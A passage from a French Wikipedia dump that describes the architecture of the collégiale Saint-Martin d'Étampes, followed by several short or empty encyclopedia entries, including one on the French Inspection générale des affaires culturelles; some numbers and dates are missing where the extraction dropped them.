Le transept n'est certes pas la partie la plus réussie de l'édifice. Les arcades reliant la croisée aux croisillons atteignent tout juste le sommet des petites arcatures des fausses galeries. Au-dessus, les murs sont nus. Contrairement à la règle, la croisée du transept n'est pas carrée ; elle est seulement un peu plus profonde que les travées de la nef. La fonction de cette travée est surtout d'assurer la transition entre abside et nef, sachant que l'abside est un peu plus basse que cette dernière, et que les trois étages de l'élévation ne correspondent pas tout à fait. Ces différences sont visuellement atténuées par l'interposition d'une travée qui rompt avec l'organisation de l'élévation dans les autres travées du vaisseau central. Les croisillons, bien que nettement plus élevés que les bas-côtés et le déambulatoire, ne disposent que d'une unique fenêtre, qui se situe dans la lunette de la voûte. Ici, le mur est plus mince, ce qui a permis de relier les galeries de l'abside et de la nef par des coursières ouvertes, sans balustrade. Au-dessus, l'on trouve une courte section de voûte en berceau. La coursière du croisillon nord est en partie établie en encorbellement, qui s'appuie sur de gros corbeaux évoquant des mâchicoulis. Au niveau du premier niveau d'élévation, les murs d'extrémité des croisillons sont aveugles, ce qui explique sans doute que l'on n'a pas hésité à plaquer une sacristie devant le croisillon sud. Au-dessus des arcades vers les bas-côtés et le déambulatoire, les murs des croisillons sont également aveugles.
Si la voûte de la croisée est flamboyante, les deux doubleaux qui l'encadrent sont analogues à ceux de la nef, et les arcades vers les croisillons sont moulurées à l'instar des grandes arcades de la nef. Les piliers montrent aussi la même composition que les piliers de la nef des années 1150 / 1160. Vers l'intérieur des croisillons, l'architecte a dû résoudre le problème que des arcs doivent être supportés à deux niveaux de hauteur, à savoir les arcades vers les bas-côtés et le déambulatoire, et les formerets. Ainsi, il a muni les piliers de deux chapiteaux superposés, plutôt que de modifier la composition des piliers. Au droit des murs extérieurs, il a tout au contraire renoncé à prévoir des supports pour le rouleau supérieur des arcades. Au nord, les supports sont analogues aux bas-côtés, et les supports de la haute-voûte se fondent dans un petit pilier cylindrique engagé dans les angles, ce qui évoque une réfection flamboyante. Ce pilier retombe sur les tailloirs qui sont réservés aux arcades dans les bas-côtés. Au droit du mur méridional, les supports sont analogues aux bas-côtés, avec la différence que le dosseret n'a pas de chapiteaux au niveau des grandes arcades. C'est toutefois sur des culs-de-lampe en haut des pilastres, et non sur des chapiteaux, que sont reçues les nervures des hautes-voûtés.
Abside.
Par ses proportions, avec une hauteur des piliers qui atteint tout juste une fois et demi la largeur, l'abside ne paraît pas particulièrement élancée. On y retrouve, à quelques différences près, déjà les mêmes élévations que dans la nef. La principale différence porte sur l'organisation des grandes arcades, qui sont au nombre de deux par travée, et retombent alternativement sur de gros piliers monocylindriques de de diamètre, appareillés en tambour, et sur des paires de piliers nettement plus fins, où un pilier est placé derrière l'autre, comme fréquemment aux étages des tribunes ou du triforium, et aux déambulatoires des cathédrales de Bayeux et Canterbury, et des églises de Deuil-la-Barre, Norrey-en-Bessin et Saint-Étienne de Caen. Le rouleau supérieur n'est pas mouluré, ce qui est surprenant pour un édifice de cette envergure. Une autre différence est l'existence d'un bandeau mouluré qui souligne le début de l'étage des fenêtres hautes, que les différents auteurs considèrent par ailleurs comme rebâti au . Enfin, des colonnettes uniques reçoivent les nervures de la voûte dans les angles entre deux pans. Ces colonnettes sont curieusement dépourvues de bases. Elles sont baguées au niveau des deux bandeaux horizontaux, et même interceptées par des chapiteaux aux corbeilles et tailloirs ronds au niveau des chapiteaux des fausses tribunes. Ces caractéristiques s'avèrent toujours nuisibles à l'impression d'élancement. En haut, les chapiteaux du second ordre portent des tailloirs carrés.
Pour Philippe Plagnieux, l'élévation de l'abside est '. Avant lui, Jacques Henriet est plus explicite. En soulignant que l'abside est contemporaine du déambulatoire de Saint-Denis, du chœur de la cathédrale de Sens et du chœur de l'abbatiale de Saint-Germer-de-Fly, il remarque que '. Outre la ressemblance avec la cathédrale de Sens, on ne peut nier des analogies avec le chœur de Saint-Germer-de-Fly. Mais bien que ce soit l'abbaye-mère de Morigny, il s'agit plutôt de convergence que d'un influencement mutuel, car en lieu et place de fausses tribunes, l'architecte de Saint-Germer a mis en place des tribunes proprement dites, qui sont voûtées d'arêtes.
Déambulatoire et chapelles rayonnantes.
Le plan du chevet évoque, selon Jacques Henriet, le . Avec Saint-Martin-des-Champs, il fournit, dans la région, le seul exemple d'un déambulatoire avec des chapelles aussi profondes. Eugène Lefèvre-Pontalis relève de nombreuses irrégularités, qui concernent la distance variable entre les colonnes du rond-point de l'abside (entre et ) ; la largeur du déambulatoire, qui est plus grande au nord qu'au sud ( par rapport à ) ; et l'ouverture des chapelles, qui est de pour la chapelle d'axe, la plus profonde, mais de pour la chapelle nord-est, et de pour la chapelle sud-est. Globalement la largeur du déambulatoire est exceptionnelle. — Les tailloirs des colonnettes gémelées du rond-point de l'abside ne supportent aucune nervure correspondant au déambulatoire. Ce sont donc les tailloirs des gros piliers qui reçoivent à la fois deux ogives, deux doubleaux, et, selon les cas, une nervure supplémentaire analogue aux doubleaux. Cette particularité résulte des voûtes triangulaires qui sont insérées entre les cinq voûtes approximativement carrées, qui se situent au nord et au sud du rond-point, et devant les chapelles, selon un principe propre à l'école champenoise (collégiale Notre-Dame-en-Vaux de Châlons-en-Champagne et basilique Saint-Remi de Reims).
Le nombre important des nervures explique peut-être que le maître d'œuvre a renoncé aux formerets vers le rond-point, mais il n'y en a pas non plus vers l'extérieur. Ici, il y a effectivement des murs, et non seulement des doubleaux, contrairement à la plupart des déambulatoires. Le déambulatoire prend donc le jour par des fenêtres en plein cintre, qui sont au nombre d'une au nord et au sud, où il n'y a pas de chapelles, et au nombre d'une par travée triangulaire, ce qui donne deux fenêtres entre deux chapelles. Les supports vers l'extérieur sont de deux types, qui sont influencés par le monde roman et la basilique de Vézelay, comme déjà signalé à propos de la nef et des bas-côtés. À la retombée des doubleaux qui délimitent les voûtes carrées, les supports sont de simples dosserets. À la retombée des nervures qui subdivisent les deux voûtes triangulaires de part et d'autre de la travée axiale, l'on trouve les mêmes supports que dans les bas-côtés. Les ogives des voûtes carrées correspondent à la quatrième travée des bas-côtés (qui abritent les seules voûtes du à l'ouest du transept). Les doubleaux et les nervures supplémentaires assimilées à ceux-ci présentent une arête entre deux tores, et un rouleau supérieur chanfreiné pour les doubleaux proprement dits. Ces dispositions ont également été reproduites dans les bas-côtés.
Les chapelles rayonnantes ont été équipées d'une polychromie architecturale néogothique, en faisant appel à différents registres chromatiques selon les chapelles, qui s'accommodent plus ou moins bien avec l'esprit de la première période gothique. Les trois chapelles s'ouvrent indifféremment par des doubleaux analogues aux grandes arcades de la nef. Ensuite, les deux chapelles plus petites au nord-est et au sud-est présentent déjà des doubleaux s'appuyant sur des supports du même type que dans les bas-côtés, ce qui souligne la grande homogénéité stylistique de la collégiale. Les deux rouleaux des doubleaux sont moulurés, ce qui n'est pas le cas dans les bas-côtés ; en revanche, aucune des deux voûtes n'est munie de formerets. Tous les auteurs ne manquent pas d'observer la dichotomie entre l'archaïsme de la forme des piliers et le modernisme du voûtement d'ogives, qui n'est pas encore systématiquement appliqué dans les églises de la région à l'approche du milieu du , comme l'illustrent la nef de la collégiale Notre-Dame, et plus tard encore, la collégiale Saint-Martin de Champeaux. Dans les absides des deux petites chapelles, ce contraste est moins perceptible, car la limite entre le mur et les voûtains est fluide, et l'impression est proche d'une voûte en cul-de-four nervurée. Comme au déambulatoire, les fenêtres sont en plein cintre. Des colonnettes uniques en délit reçoivent les ogives de part et d'autre de la baie d'axe. La sculpture des chapiteaux est d'un bon niveau, et fait souvent appel à la feuille d'acanthe. Une particularité est le bandeau mouluré qui court à la limite des allèges, et qui fait le tour des deux colonnettes près de la baie d'axe, tout en s'éclipsant au niveau des supports du doubleau intermédiaire. Pour ce qui est de la chapelle axiale, plus grande et plus profonde que les deux autres, elle se distingue par l'existence de formerets plats et non moulurés dans la première travée, et des piliers plus complexes. Le noyau correspond à la moitié d'un pilier cruciforme. Les formerets et le rouleau supérieur retombent directement sur le pilier, qui à ces endroits est pourvu de tailloirs et chapiteaux. Pour les ogives, des colonnettes sont logées dans les deux angles, et pour le rouleau inférieur du doubleau, des colonnettes légèrement plus fortes sont engagés dans les faces antérieures des piliers.
Extérieur.
Clocher.
Le clocher remplace un clocher latéral du . Il était appelé la tour de la reine Blanche, et la tradition le localise au-dessus du croisillon sud, où les restaurations modernes ont effacé les éventuelles traces. Le clocher actuel s'élève à peu de distance avant la façade occidentale, à laquelle il a été relié en 1873 seulement. Derrière, l'on aperçoit une claire-voie et une rosace en haut de la façade, qui sont sans style et datent également des années 1870. La construction s'est échelonnée de 1530 environ à 1537. Après l'achèvement des premiers étages, un tassement de terrain s'est produit (le monument étant construit sur une assise instable, une poche de tourbe), et la tour s'est inclinée vers l'ouest. Les architectes ont essayé de rattraper ce défaut en lui donnant un profil incurvé vers l'est : la tour est désormais inclinée jusqu’à son deuxième niveau. Le décalage avec le mur est alors de tandis que la partie supérieure est verticale. L'étage de beffroi, qu'Eugène Lefèvre-Pontalis qualifie de moderne, est copié sur l'église Saint-Gilles d'Étampes. Il présente des murs presque parfaitement verticaux, et serait destiné à faire contrepoids. Culminant à quarante mètres, le manque d'aplomb est finalement de .
Jusqu'à la terrasse qui marque la fin des travaux entrepris au cours des années 1530, le clocher est scandé par cinq niveaux de larmiers, dont un sur deux correspond à la limite entre deux étages. Les angles sont épaulés par deux contreforts orthogonaux, strictement verticaux et fortement saillants. L'appareil est en pierre de taille. De nombreux trous de boulin sont visibles à tous les niveaux. L'on entre dans le clocher par un portail Renaissance en plein cintre à l'ouest, qui est assez bas, et entouré d'une double archivolte moulurée et sculptée de losanges et de cercles ou parfois des rosaces en alternance. Dans le prolongement des piédroits de l'archivolte supérieure, deux niches à statues avec de volumineux dais architecturés sont établies dans les angles. Latéralement, le clocher devait primitivement s'ouvrir par de hautes arcades en tiers-point, qui ont été bouchées et remplacées par des portails Renaissance en cours de construction. Ils sont aujourd'hui également bouchés. Des fenêtres n'existent que du côté ouest : il s'agit d'un grand oculus rond, qui s'inscrit dans un carré, et qui est bouché par des planches, et d'une petite ouverture rectangulaire au dernier niveau d'élévation, qui est curieusement flanqué de deux colonnettes corinthiennes, qui supportent un entablement ébauché. Plus haut, des corniches formées par de petits mâchicoulis, analogues à la coursière du croisillon nord, supportent une balustrade pleine dont les surfaces sont agrémentées de caissons. L'étage de beffroi est placé un peu en retrait, et dépourvu de contreforts. Chaque face est percée de deux baies abat-son en plein cintre. Selon l'usage au sud de Paris, chaque face est également surmontée d'un pignon, qui est à son tour percé d'une baie abat-son en arc brisé. Une gargouille fait saillie à chaque angle. Le décor se limite à des masques grotesques garnissant les rampants des pignons. Le toit est couvert de tuiles plates.
Élévations latérales.
Les élévations latérales de la nef et des bas-côtés ne montrent pas une rupture de style à l'endroit où l'on l'attendrait, c'est-à-dire entre la première et la seconde travée, sachant que la première travée a été ajoutée après coup en 1213. Les restaurateurs du ayant gommé toute différence de la première travée, la seule rupture bien visible se situe aujourd'hui entre la troisième et la quatrième travée. La quatrième travée est la seule qui a été voûtée d'ogives dès l'origine, comme en témoignent encore aujourd'hui les voûtes de ses bas-côtés, celle de la nef s'étant effondrée au . À l'instar des autres fenêtres latérales, la baie du bas-côté est entourée d'un double ressaut chanfreiné. Elle est en plus surmontée d'un bandeau mouluré, qui se poursuit jusqu'aux contreforts au niveau des impostes. Il se compose d'un boudin non dégagé et d'un cordon percé de petits trous cubiques très rapprochés. Une corniche imite cette même disposition. Ces éléments du décor ont été abandonnés pour les travées construites après. La fenêtre haute utilise presque toute la hauteur disponible, tandis que les fenêtres hautes des autres travées commencent plus haut et ont leur sommet situé plus bas. Un bandeau court à gauche et à droite de leur seuil, qui devait servir à une certaine époque d'appui au toit en appentis. En plus de ces différences, la quatrième travée du sud possède un élément qui n'était d'emblée pas destiné à être reproduit sur les travées occidentales : il s'agit d'un portail en arc brisé, aujourd'hui bouché, qui possède un tympan monolithique servant en même temps de linteau, et qui est surmonté d'un bandeau analogue à celui de la fenêtre au-dessus. Ce portail, toujours visible depuis l'intérieur, a été remplacé par un portail en arc en mitre dans la travée voisine.
Ce qui fait l'intérêt des élévations extérieures de la collégiale Saint-Martin ne sont, bien entendu, ni les ouvertures, ni les détails de la décoration, mais les arcs-boutants primitifs ou leurs vestiges, sur lesquels Jacques Henriet a attiré l'attention dans un article publié dans le "Bulletin monumental" de 1978. Cette publication est la première qui met en question la théorie qu'Eugène Lefèvre-Pontalis développe dans son article "L'Origine des arcs-boutants", paru dans les actes du "Congrès archéologique de France" tenue à Paris en 1919, tout en faisant une démonstration sur un monument encore intact. Lefèvre-Pontalis avait prétendu que les arcs-boutants extérieurs (non dissimulés par les toits des collatéraux) auraient fait leur apparition sur la cathédrale Notre-Dame de Paris vers 1180. Des auteurs avaient déjà fait part de leur réserve sur cette théorie, et affirmé l'antériorité potentielle des arcs-boutants des absides de la basilique de Saint-Denis et de la cathédrale de Sens, mais puisque ces arcs-boutants ont tous disparu, leurs hypothèses n'ont pas été entendues. Jacques Henriet découvre que l'abbé Thévin fut élu abbé de Morigny en 1144, et qu'il présida par conséquent à la phase essentielle du chantier de la collégiale, ce qui n'est pas sans importance, puisqu'avant avoir été élu prieur d'Argenteuil en 1137, il avait été sous-prieur de Saint-Denis et donc homme de confiance de Suger. Or, Suger est le bâtisseur de l'abside et de l'avant-nef de la basilique Saint-Denis, l'un des premiers édifices gothiques. Ceci permet d'envisager la mise en œuvre d'une innovation importante telle que l'arc-boutant à Étampes, dès les dernières années précédant le milieu du .
La phrase de Lefèvre-Pontalis ' était donc une erreur, et plus encore l'une des phrases suivantes, '. Les arcs-boutants les plus anciens de la collégiale Saint-Martin concernent naturellement l'abside et non la nef, mais il n'en reste qu'une culée et un contrefort servant de support (voir ci-dessous). La dernière volée du milieu du encore intacte se situe entre la troisième et la quatrième travée de la nef, au sud, et remonte à la même phase de la construction que la quatrième travée. Ici, l'on trouve donc un arc-boutant des années 1160, qui devrait correspondre au même modèle qu'appliqué douze ou quinze ans auparavant au sud-est et au nord-est de l'abside. Il s'élève au-dessus d'un volumineux contrefort, qui, avec ses trois faibles ressauts, est tout à fait caractéristique de la première période gothique. Les croisillons, qui n'ont pas encore été décrits, ont des contreforts du même type, et leurs fenêtres sont décorées de la même façon que les fenêtres basses de la quatrième travée. Sous la culée, le contrefort se retraite par de courts glacis sur ces trois faces libres ; puis, il est décoré par le même bandeau qui surmonte les fenêtres signalées. La culée comporte une partie verticale et un chaperon en bâtière à gradins, sur laquelle retombe la volée, nettement plus mince que la culée et le contrefort. Il n'y a donc pas de charge, ni de chaperon au sommet des culées, ce qui fait la principale différence avec les arcs-boutants du début du que l'on trouve plus à l'ouest. Une autre particularité est le tracé en quart-de-cercle de la volée, et sa surface plate. Les arcs-boutants du début du ont la surface convexe, afin de rejeter l'eau pluviale et éviter son infiltration ; plus tard seulement, les arcs-boutants seront munis de chéneaux et de gargouilles, et leurs culées sommées de pinacles. Ce stade d'évolution plus tardive ne se rencontre pas à la collégiale Saint-Martin.
Chevet.
Le chevet est surtout remarquable pour la disposition générale des volumes, avec quatre hémicycles sur deux niveaux et une saillie comparable pour le rond-point de l'abside et les chapelles rayonnantes. En plus, l'éloignement des murs hauts diminue visuellement la largeur du rond-point de l'abside, et les chapelles paraissent ainsi tout aussi larges que l'abside principale. L'architecture de celle-ci est d'une grande simplicité. Il n'y a pas (ou plus) de corniche, mais seulement une tablette biseautée. Les fenêtres sont entourées d'un boudin, sans chapiteaux. Elles prennent appui sur un bandeau mouluré continu, qui se compose d'un boudin aplati en dessous d'une tablette biseauté ou larmier. Le bandeau passe autour des contreforts plats, qui s'amortissent par un glacis formant larmier très pentu. Sauf au sud, des arcs-boutants du début du (ou refaits ultérieurement selon le modèle de cette époque) épaulent les contreforts. L'arc-boutant du sud a disparu, mais sa culée du milieu du , analogue à celle du dernier contrefort au sud de la nef, subsiste encore. C'est un contrefort à ressauts sans glacis sommital, dont Jacques Henriet signale l'emprise sur le sol très importante, soit de profondeur pour de largeur. Au nord, un contrefort semblable sert de base à un arc-boutant du . Son emprise sur le sol est de sur seulement. À titre de comparaison, les deux contreforts dans l'intersection entre deux chapelles ne mesurent que sur . Jacques Henriet n'est pas certain que des arcs-boutants primitifs existaient à ces endroits. Le fait que le bandeau qui fait le tour du chevet à la limite des allèges fasse le tour de ces contreforts plus minces ne donne plutôt pas à penser qu'il s'agit de rajouts postérieurs. — Saint-Martin d'Étampes n'est aujourd'hui plus la seule église du milieu du dont l'on sait qu'elle comporte des arcs-boutants primitifs : Philippe Plagnieux a fait la démonstration pour les chœurs de Saint-Germain-des-Prés et Domont.
Les parties basses du chevet ne sont pas homogènes. Au début et à la fin, le déambulatoire possède des baies en arc brisé, qui sont entourées d'un double ressaut chanfreiné, comme les fenêtres hautes de la nef, et les baies des bas-côtés et des croisillons. Ces baies sont en outre surmontées d'un bandeau torique. Il n'y a ici aucun élément de scansion horizontal, ni de bandeau à la limite des soubassements, ni de corniche. Les murs sont exécutés en pierre de moyen appareil. Sur le reste du chevet, l'on note tout au contraire un tel bandeau, ainsi qu'une corniche de modillons frustes. Les soubassements sont en blocage. Les fenêtres des chapelles, ainsi que celles du déambulatoire situées entre les chapelles, sont toutes en plein cintre, et comme autre différence, les allèges sont plus basses. Les baies des chapelles présentent sinon les mêmes dispositions que les baies du déambulatoire au nord et au sud, tandis que les fenêtres du déambulatoire entre deux chapelles ne sont pas du tout décorées, et même pas ébrasées. Les fenêtres de la première travée de la chapelle axiale sont nettement plus grandes que les autres. Quant aux contreforts, celles du déambulatoire ont déjà été décrits dans le contexte des arcs-boutants. Les contreforts des chapelles sont presque plats et s'achèvent par un chaperon en bâtière. Ces contreforts sont loin d'arriver au sommet des murs, mais s'arrêtent plus ou moins au niveau de la retombée des voûtes. Au chevet, la chapelle d'axe possède deux contreforts-colonnes d'inspiration purement romane, comme on les trouve par exemple à l'église Saint-Étienne de Beauvais. L'on note encore que le mur en hémicycle de l'abside de la chapelle d'axe est placé en léger retrait par rapport aux murs droits, ce qui est un trait propre aux absides voûtées en cul-de-four.
Mobilier.
Parmi le mobilier de l'église, un total de neuf éléments sont classés ou inscrits monument historique au titre objet, dont trois monuments funéraires. S'y ajoutent deux statues classées, qui ont été volées en 1974.
Parmi les éléments du mobilier non inscrits ou classés, l'on peut signaler un médaillon arborant un bas-relief de l'Assomption ; une statue de saint Martin ; et les fonts baptismaux du en pierre calcaire sculptée et peinte. Deux clochettes en fonte du , une cloche datant de l'an 1600 provenant de la chapelle de Housse en Belgique, une cloche en bronze de 1804 nommée Nicolas-Marie et une dernière de 1862 nommée Augustine sont disposées dans le clocher.

</doc>
<doc id="3215966" url="https://fr.wikipedia.org/wiki?curid=3215966" title="Bill Walsh (acteur)">
Bill Walsh (acteur)

William J. Walsh (né le ) est un pompier new-yorkais, connu pour son rôle dans la série télévisée "New York 911". Il fut également consultant de la série en tant que pompier. Walsh est actuellement capitaine de la brigade 41 du FDNY dans le South Bronx.
Billy Walsh participe à un documentaire spécial où il donne ses impressions et ses souvenirs sur les attentats du 11 septembre 2001 avec d'autres pompiers de la ville de New York. Ce documentaire appartient à la série "New York 911". Il n'a jamais été diffusé en France.
Filmographie.
1999 - 2005 : "New York 911" : Billy Walsh

</doc>
<doc id="3215968" url="https://fr.wikipedia.org/wiki?curid=3215968" title="Pempoull">
Pempoull



</doc>
<doc id="3215985" url="https://fr.wikipedia.org/wiki?curid=3215985" title="Frank Lee Woodward">
Frank Lee Woodward

Frank Lee Woodward, né le à Saham Toney (Norfolk) et mort le à Beaconsfield (Tasmanie), est un bouddhiste et théosophe britannique.
Vie et œuvre.
Woodward est né le à Saham Toney ; il est le troisième fils de William Woodward et de Mary Elizabeth Ann Lee. Son père, pasteur, lui donne d'abord cours, puis il fréquente l'internat de Christ's Hospital (Sussex de l'Ouest). Il étudie les lettres classiques au Sidney Sussex College de Cambridge et obtient sa maîtrise ès arts (M.A.) en 1902. Il est ensuite professeur dans plusieurs Public Schools en Angleterre.
En 1902, il adhère à la Société théosophique d'Adyar, obtenant, en 1903, le poste de doyen du Mahinda College fondé par Henry Steel Olcott à Galle à Ceylan, maintenant le Sri Lanka. Jusqu'en 1919, il est aussi actif comme traducteur de textes bouddhiques pour la Pali Text Society. En 1919, il déménage à Launceston (Tasmanie), où il poursuit ses études bouddhiques et la traduction de textes pâli en anglais.

</doc>
<doc id="3216006" url="https://fr.wikipedia.org/wiki?curid=3216006" title="Cerha Friedrich">
Cerha Friedrich



</doc>
<doc id="3216015" url="https://fr.wikipedia.org/wiki?curid=3216015" title="Antoni Sivera">
Antoni Sivera

Antoni Sivera est un footballeur international andorran né le qui évolue au FC Santa Coloma au poste de milieu de terrain défensif.
Biographie.
Lors de la saison 2005-2006, avec son compère de la sélection andorranne José Manuel Ayala, il signe dans le club ariégeois de l'US Luzenac en CFA français.
Toni Sivera est connu en Andorre pour avoir touché la transversale du but de Grégory Coupet lors du match amical contre la France en préparation de l'Euro 2004 au Portugal le et alors que les Bleus n'encaissaient pas de but depuis dix matchs.

</doc>
<doc id="3216016" url="https://fr.wikipedia.org/wiki?curid=3216016" title="Coteaux Varois (AOC)">
Coteaux Varois (AOC)



</doc>
<doc id="3216018" url="https://fr.wikipedia.org/wiki?curid=3216018" title="Inspection générale des affaires culturelles">
Inspection générale des affaires culturelles

L’Inspection générale des affaires culturelles (IGAC) est un service d’inspection français, dont le champ s'étend à l'ensemble du domaine culturel, placé sous l’autorité directe du ministre de la Culture. 
Elle assure des missions de contrôle, de conseil ou d’évaluation. Elle peut également exercer des missions d’appui, d’audit, d’évaluation des politiques publiques, d’enquête administrative, d’expertise ainsi que des missions d’étude ou de médiation.
L’Inspection peut effectuer des missions à la demande du Premier ministre ou du ministre chargé de la Culture.
Ses missions s’exercent à l'égard des services centraux et déconcentrés, des services à compétence nationale, des établissements publics nationaux et des organismes relevant du ministère de la Culture ou bénéficiant d'un concours direct ou indirect de ses services.
Elle peut effectuer des missions à la demande d'autres autorités nationales, d'organismes publics, de collectivités territoriales, de fondations ou d'associations, d'Etats étrangers, d'organisations internationales ou de l'Union européenne sous autorisation du ministre chargé de la Culture.
L'IGAC peut réaliser des missions conjointes avec d'autres Inspections générales (IGAS, IGA, IGÉSR, IGF) ainsi que des missions partagées associant les Inspections spécialisées relevant des directions générales du ministère.
Un membre de l'Inspection générale des affaires culturelles peut être chargé par le ministre chargé de la culture de l'intérim de la présidence ou de la direction d'un établissement ou organisme relevant de sa tutelle ou de son pouvoir de nomination.
Histoire.
Après la création du ministère des Affaires culturelles, dirigé par André Malraux, en 1959; s'affirme la nécessité d'une Inspection générale disposant d’une compétence transversale sur l’ensemble des activités du ministère.
L'IGAC devient inspection générale rattachée auprès du ministre d'État en 1965.
En 1970, l'inspection générale prend le nom d'Inspection générale des services administratifs (IGSA).
Le corps a été créé le , par le décret 73-1060, sous le nom d'I"nspection générale de l'administration des affaires culturelles" (IGAAC).
Auparavant, il existait des inspecteurs généraux des services administratifs et un inspecteur général de la création artistique.
Dans le statut de 1973, le corps comprenait alors des inspecteurs généraux de et de . Ce statut a ensuite été modifié en 1985, en 1987, en 1989 et en 1998, les modifications touchant le mode de recrutement et la structure du corps.
Le décret de 1973 est abrogé et remplacé par le décret 2003-446 du . Cette réforme de 2003 élargit encore les possibilités de recrutement et supprime la division entre et . Il y avait alors 19 inspecteurs, dont deux en détachement.
Le décret du est complété par un autre décret, du , sur l'organisation de l'Inspection en tant que service.
L'IGAAC devient l'IGAC par décret 2008-144 du (ou en 2003, décret n° 2003-446 du 19 mai 2003 portant statut du corps de l’inspection générale des affaires culturelles). Elle voit ses compétences s'étendre progressivement, appuyées sur un mode de recrutement élargi.
Par le décret du 14 septembre 2010, son recrutement est étendu aux membres issus des corps des conservateurs généraux du patrimoine, des conservateurs généraux des bibliothèques, des inspecteurs et conseillers de la création et des enseignements artistiques et de l'action culturelle et des architectes et urbanistes de l'État.
Le domaine des compétences de l'IGAC est élargi aux activités relevant des médias et de la communication depuis 2010.
Le décret n°2022-1677 du 27 décembre 2022 signé par la Première ministre Élisabeth Borne et la ministre de la Culture Rima Abdul-Malak modifie l’organisation de l’Inspection générale des affaires culturelles (IGAC). Le décret modifie le mode de recrutement des nouveaux inspecteurs, la prise en compte d'un comité de coordination et renforce l'indépendance des travaux des inspecteurs et des inspectrices des affaires culturelles.
La réforme des Inspections générales et son impact sur l'IGAC.
La réforme de l’encadrement supérieur de la fonction publique de l’État s’est traduite par la création, par le décret du , du corps des administrateurs de l’État et par la mise en extinction, à compter du 1er janvier 2023, des corps des préfets et sous-préfets et de tous les corps d’Inspection générale et de contrôle de l’État, dont celui de l’Inspection générale des affaires culturelles.
Le décret du 9 mars 2022 relatif aux services d’inspection générale et de contrôle et aux emplois au sein de ces services est venu préciser les conditions de mise en œuvre du statut d’emploi désormais dévolu à l’ensemble des inspections générales.
À partir du , les emplois d’Inspection générale sont ainsi pourvus par voie de détachement pour les titulaires, par contrat pour les non titulaires, pour une durée maximale de cinq ans renouvelable, sans que la durée d'exercice de ces fonctions puisse excéder dix ans.
Les recrutements se font désormais dans trois groupes d’emploi, en fonction du niveau des missions susceptibles d'être confiées, du degré d'expertise exigé ou de la diversité du parcours professionnel antérieur.
La durée initiale maximale d’occupation de l’emploi d’inspecteur général des affaires culturelles est fixée à cinq ans, renouvelable sans que la durée d’exercice continue des fonctions dans l’emploi concerné puisse excéder dix ans.
La durée initiale maximale d’occupation de l’emploi d’inspecteur des affaires culturelles est fixée à trois ans, renouvelable sans que la durée d’exercice continue des fonctions dans l’emploi concerné puisse excéder dix ans.
Les Inspecteurs généraux des affaires culturelles présents dans le corps au 1er janvier 2023 peuvent en rester membres (clause dite « du grand père), ou demander à être intégrés dans le corps des administrateurs de l’État. En ce cas ils sont détachés de plein droit dans le nouveau statut d’emploi. Ce droit d’option leur est ouvert pendant un an, du au 31 décembre 2023.
En outre, le décret du 9 mars 2022 prévoit qu'un décret définisse l'organisation et les missions de chaque service d'inspection générale ou de contrôle et précise les conditions et méthodes de travail permettant de garantir l'indépendance et l'impartialité des travaux des Inspecteurs. L'IGAC a élaboré un projet de décret, en lien avec le Secrétariat général du ministère et les autres services d'inspection générale et de contrôle, pour adapter le décret du qui régissait jusqu'ici son organisation, en vue d'une entrée en vigueur au 1er janvier 2023.
Missions.
L'Inspection générale des affaires culturelles a des missions : 
La Mission ministérielle d'audit interne (MMAI).
L'audit interne vise à offrir à chaque ministre une assurance quant au niveau de contrôle des risques liés à la gestion des politiques publiques relevant de ses services, en évaluant les dispositifs de contrôle interne sur l'ensemble des fonctions et métiers du ministère de la Culture et fournir des conseils pour son amélioration. Un comité ministériel définit la programmation annuelle des audits.
Instaurées par décret n°2011-775 du 28 juin 2011, abrogé par décret n° 2022-634 du 22 avril 2022, les missions de contrôles et audits internes de l'État ont été renforcées. Le décret vise à renforcer l'efficacité et l'impact des démarches de contrôle et d'audit internes en établissant les règles applicables aux activités de contrôle et d'audit internes au sein de l'administration de l'État.
L'objectif est d'assurer une gestion plus efficace des risques, d'améliorer la transparence et la responsabilité dans l'administration de l'État et favoriser une utilisation plus efficiente des ressources publiques.
Le programme des missions d'audit interne est établi sur une base pluriannuelle par le comité ministériel d'audit interne (CMAI), présidé par la ministre de la Culture ou son représentant, le directeur du cabinet. Ce programme est régulièrement mis à jour lors de chaque réunion du CMAI, en se basant sur les cartographies des risques en cours d'élaboration au sein des services. Ces cartographies des risques sont validées par le comité de maîtrise des risques (CMR), mis en place à l'automne 2021 et dirigé par la mission du contrôle interne pour la maîtrise des risques (MCIMR) du Secrétariat général du ministère de la Culture.
La Mission santé-sécurité au travail (MISST).
Les Inspecteurs santé sécurité au travail (ISST) sont rattachés fonctionnellement à l’Inspection générale des affaires culturelles depuis 2004.
Ce rattachement permet de préserver leur indépendance, l’objectivité de leurs constats et de favoriser l’effectivité de leurs recommandations.
Les ISST exercent leurs missions dans le cadre défini par le décret modifié du 28 mai 1982 relatif à l’hygiène et la sécurité du travail ainsi qu’à la prévention médicale dans la fonction publique, notamment celle de contrôler les conditions d’application des règles des livres I à V de la quatrième partie du Code du travail.
Ils effectuent les missions suivantes : 
Sous l'autorité du chef de service de l'IGAC, Rémi Tomaszewski, Inspecteur général des affaires culturelles, coordonne cette mission depuis l'été 2022.
Composition et organisation.
Le corps des Inspecteurs est constitué de 27 membres dont 3 chargées de mission d’Inspection générale.
Pour les 13 DRAC et les 4 DAC, un à deux référent IGAC est nommé, sous la coordination d'un correspondant du département de l'action territoriale.
Le corps des Inspecteurs santé-sécurité au travail se compose de 5 membres.
L’audit interne est composé de 2 membres.

</doc>
<doc id="3216024" url="https://fr.wikipedia.org/wiki?curid=3216024" title="Everybuddy">
Everybuddy



</doc>
<doc id="3216027" url="https://fr.wikipedia.org/wiki?curid=3216027" title="Michel II d'Épire">
Michel II d'Épire



</doc>
<doc id="3216029" url="https://fr.wikipedia.org/wiki?curid=3216029" title="Inspection générale de l'administration des Affaires culturelles">
Inspection générale de l'administration des Affaires culturelles



</doc>
<doc id="3216030" url="https://fr.wikipedia.org/wiki?curid=3216030" title="Galilée (édition)">
Galilée (édition)



</doc>
<doc id="3216034" url="https://fr.wikipedia.org/wiki?curid=3216034" title="Constitution de la Monarchie romaine">
Constitution de la Monarchie romaine

